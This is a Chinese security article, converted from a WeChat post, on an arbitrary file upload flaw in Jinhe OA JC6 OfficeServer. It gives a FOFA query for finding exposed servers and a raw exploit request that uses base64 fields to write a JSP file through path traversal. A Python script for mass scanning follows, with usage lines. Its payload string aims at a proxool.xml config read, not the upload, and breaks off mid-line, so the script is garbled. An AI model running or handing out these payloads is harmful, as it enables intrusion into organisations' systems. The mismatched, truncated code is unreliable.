> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Q1HNUQATd480R_DhHA_-hA)

#### 金和 OA JC6 OfficeServer 任意文件上传漏洞

**FOFA**：`app="金和网络-金和OA"`

```
POST /jc6/OfficeServer HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=63766573e5ae9ee9aa8ce5aea4e79a84706f63
Connection: close
Content-Length: 138

hacker test 87 0 533 
DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
FILENAME=Li4vLi4vcHVibGljL2VkaXQvaW5mby5qc3A=
<%out.println("only test");%


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSYqUMZKUfoST0licj4Rz3ABno98PeGd2FTq0PkPPCwib2yQ41mg6hHNjc99YqwoOFibDpGUoOsCicRw8A/640?wx_fmt=png)

##### 批量漏洞

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/8/17 17:48
# Author     : yunkong
# FileName   : JinHeOA_JC6_Upload_File.py
# Description: 金和OA JC6 OfficeServer 任意文件上传漏洞

import argparse
import requests
import concurrent.futures


def send_post_request(target_url, data):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/12.0.3 Safari/605.1.15",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Encoding": "gzip",
        "Content-Length": str(len(data))
    }

    try:
        response = requests.post(target_url, headers=headers, data=data)
        if response.status_code == 200:
            print("Request successful for:", target_url)
            print(response.text)
        else:
            print("Request failed with status code for:", target_url, response.status_code)
    except requests.exceptions.RequestException as e:
        print("Error for:", target_url, str(e))


def main():
    parser = argparse.ArgumentParser(description="Send POST requests to target URLs")
    parser.add_argument("-u", "--url", help="Single target URL")
    parser.add_argument("-U", "--url-file", help="File containing multiple target URLs")
    args = parser.parse_args()

    data = "op=verify%7Clogin&targetpage=&errorpage=WEB-INF/classes/proxool.xml&mark=&tzo=480&user

    if args.url:
        send_post_request(args.url, data)
    elif args.url_file:
        with open(args.url_file, 'r') as url_file:
            url_list = [line.strip() for line in url_file]

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            for url in url_list:
                executor.submit(send_post_request, url, data)
    else:
        parser.print_help()


if __name__ == '__main__':
    main()



```

##### 使用方法

```
# 单个目标
python example.py -u http://example.com

# 多个目标
python example.py -U file_path


```

  
​